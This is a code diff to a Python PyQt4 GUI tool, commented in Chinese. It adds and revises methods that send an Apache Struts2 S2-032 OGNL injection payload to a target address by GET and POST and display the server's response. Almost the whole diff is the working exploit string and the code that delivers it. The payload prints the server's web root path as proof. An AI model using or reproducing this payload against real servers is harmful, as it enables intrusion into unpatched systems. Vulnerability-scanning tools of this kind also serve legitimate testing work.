@@ -16,17 +16,22 @@ class StartQt4(QtGui.QMainWindow):
         QtCore.QObject.connect(self.ui.comboBox, QtCore.SIGNAL("currentIndexChanged(int)"), self.mode)
         QtCore.QObject.connect(self.ui.pushButton_2, QtCore.SIGNAL("clicked()"), self.file_dialog)
 
+    def PoC_POST(self):
+        #此为PoC的POST方法
+        try:
+            payload= "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get%28%23a%29,%23b%3d%23req.getRealPath%28%23c%29,%23hh%3d%23context.get%28%23parameters.rpsobj[0]%29,%23hh.getWriter%28%29.println%28%23parameters.content[0]%29,%23hh.getWriter%28%29.println%28%23b%29,%23hh.getWriter%28%29.flush%28%29,%23hh.getWriter%28%29.close%28%29,1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj=111&content=S2-032%20dir--***"
+            res = urllib.request.Request(self.address, payload.encode("utf-8"))
+            data = urllib.request.urlopen(res).read().decode("utf-8")
+            self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
+        except Exception as e:
+            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
+
     def PoC(self):
         payload= "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get%28%23a%29,%23b%3d%23req.getRealPath%28%23c%29,%23hh%3d%23context.get%28%23parameters.rpsobj[0]%29,%23hh.getWriter%28%29.println%28%23parameters.content[0]%29,%23hh.getWriter%28%29.println%28%23b%29,%23hh.getWriter%28%29.flush%28%29,%23hh.getWriter%28%29.close%28%29,1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj=111&content=S2-032%20dir--***"
         target_url = (self.address + payload)
-        #print(target_url)
         try:
-            req = urllib.request.Request(target_url, method = "GET")
-            response = urllib.request.urlopen(req) 
-            if response:
-                data = response.read()
-                data = str(data, encoding = "utf-8")
-                self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
+            data = requests.get(target_url).content.decode("utf-8")
+            self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
         except Exception as e:
             self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
         
